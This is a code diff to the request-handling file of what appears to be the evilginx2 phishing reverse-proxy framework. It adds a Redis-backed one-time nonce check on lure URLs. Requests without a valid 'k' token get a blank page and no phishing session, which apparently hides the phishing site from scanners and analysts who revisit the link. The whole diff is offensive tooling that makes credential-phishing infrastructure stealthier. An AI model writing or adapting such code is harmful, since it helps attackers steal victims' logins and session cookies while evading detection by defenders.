@@ -31,6 +31,7 @@ import (
 	"strings"
 	"sync"
 	"time"
+	"context"
 
 	"golang.org/x/net/proxy"
 
@@ -42,6 +43,8 @@ import (
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
+
+	"github.com/redis/go-redis/v9"
 )
 
 const (
@@ -90,6 +93,8 @@ type ProxySession struct {
 	PhishletName string
 	Index        int
 }
+
+var ctxbg = context.Background()
 
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
@@ -313,9 +318,24 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 
 					if create_session /*&& !p.isWhitelistedIP(remote_addr, pl.Name)*/ { // TODO: always trigger new session when lure URL is detected (do not check for whitelisted IP only after this is done)
+						rdb := redis.NewClient(&redis.Options{
+						        Addr:     "localhost:6379",
+						        Password: "", // no password st
+						        DB:       0,  // use default DB
+						    })
+						if os.Getenv("CHECK_NONCE") != "" {
+							nonce := req.URL.Query().Get("k")
+							log.Info("Nonce: %s",nonce)
+							_, err := rdb.GetDel(ctxbg, nonce).Result()
+							if err == redis.Nil {
+								log.Warning("No matching nonce. Rejecting request")
+								return req, goproxy.NewResponse(req, "text/plain", http.StatusOK, "")
+							}
+						}
 						// session cookie not found
 						if !p.cfg.IsSiteHidden(pl_name) {
 							if l != nil {
+
 								// check if lure is not paused
 								if l.PausedUntil > 0 && time.Unix(l.PausedUntil, 0).After(time.Now()) {
 									log.Warning("[%s] lure is paused: %s [%s]", hiblue.Sprint(pl_name), req_url, remote_addr)
